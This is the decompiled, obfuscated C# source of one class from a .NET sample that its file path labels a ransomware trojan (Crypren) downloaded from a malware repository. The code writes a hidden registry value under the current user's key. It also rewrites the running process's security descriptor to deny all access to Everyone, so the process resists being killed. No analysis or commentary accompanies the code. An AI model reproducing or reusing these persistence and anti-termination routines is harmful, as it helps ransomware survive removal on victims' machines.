// Decompiled with JetBrains decompiler
// Type: cmxGDwJsHiH.utunjQFNHhMFoTtd
// Assembly: client1122, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C74D9760-F9BD-4A1E-9145-1F0BB7E43FF5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.05-msil\HEUR-Trojan-Ransom.MSIL.Crypren.gen-27ba35dbeb5324bd780ae6a95c5aae93fcb47c5aa8f48b1c21f83000a55de2da.exe

using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;

namespace cmxGDwJsHiH
{
  internal sealed class utunjQFNHhMFoTtd
  {
    [NonSerialized]
    internal static GetString \u0084;

    [DllImport("advapi32.dll", EntryPoint = "GetKernelObjectSecurity", SetLastError = true)]
    private static extern bool RvJKrluyOeO(
      IntPtr ZTJipUTGKlpi,
      int nvpMoWinjLeJs,
      [Out] byte[] jyRQsWqABFnqd,
      uint IIRrjyPIaoLtUQc,
      out uint sMxoqNxhrIt);

    [DllImport("advapi32.dll", EntryPoint = "SetKernelObjectSecurity", SetLastError = true)]
    private static extern bool PZCnfHOGOHCNq(
      IntPtr vGoLRHZPsBcTF,
      int WjGDfHFzSGUay,
      [In] byte[] NcYsWlOQdNK);

    [DllImport("kernel32.dll", EntryPoint = "GetCurrentProcess")]
    private static extern IntPtr LNhTrCZODnBK();

    public void uBuKtAEeAhzYa([In] bool obj0)
    {
      try
      {
        RegistryKey subKey = Registry.CurrentUser.CreateSubKey(GGXHsdxTjwNJn.hIhPBIfOSm(utunjQFNHhMFoTtd.\u0084(107409975)));
        subKey.SetValue(GGXHsdxTjwNJn.hIhPBIfOSm(utunjQFNHhMFoTtd.\u0084(107409870)), (object) utunjQFNHhMFoTtd.\u0084(107410063));
        subKey.Close();
      }
      catch
      {
      }
    }

    private RawSecurityDescriptor EcpioSeFFklOJ([In] IntPtr obj0)
    {
      byte[] jyRQsWqABFnqd = new byte[0];
      uint sMxoqNxhrIt;
      utunjQFNHhMFoTtd.RvJKrluyOeO(obj0, 4, jyRQsWqABFnqd, 0U, out sMxoqNxhrIt);
      if (sMxoqNxhrIt < 0U || sMxoqNxhrIt > (uint) short.MaxValue)
        return (RawSecurityDescriptor) null;
      byte[] binaryForm;
      return !utunjQFNHhMFoTtd.RvJKrluyOeO(obj0, 4, binaryForm = new byte[(IntPtr) sMxoqNxhrIt], sMxoqNxhrIt, out sMxoqNxhrIt) ? (RawSecurityDescriptor) null : new RawSecurityDescriptor(binaryForm, 0);
    }

    private void FZQyALfnOcy([In] IntPtr obj0, [In] RawSecurityDescriptor obj1)
    {
      byte[] numArray = new byte[obj1.BinaryLength];
      obj1.GetBinaryForm(numArray, 0);
      utunjQFNHhMFoTtd.PZCnfHOGOHCNq(obj0, 4, numArray);
    }

    public void SmgmhjqfKtA()
    {
      try
      {
        IntPtr num = utunjQFNHhMFoTtd.LNhTrCZODnBK();
        RawSecurityDescriptor securityDescriptor = this.EcpioSeFFklOJ(num);
        securityDescriptor.DiscretionaryAcl.InsertAce(0, (GenericAce) new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, (SecurityIdentifier) null), false, (byte[]) null));
        this.FZQyALfnOcy(num, securityDescriptor);
      }
      catch (Exception ex)
      {
      }
    }

    static utunjQFNHhMFoTtd() => Strings.CreateGetStringDelegate(typeof (utunjQFNHhMFoTtd));
  }
}
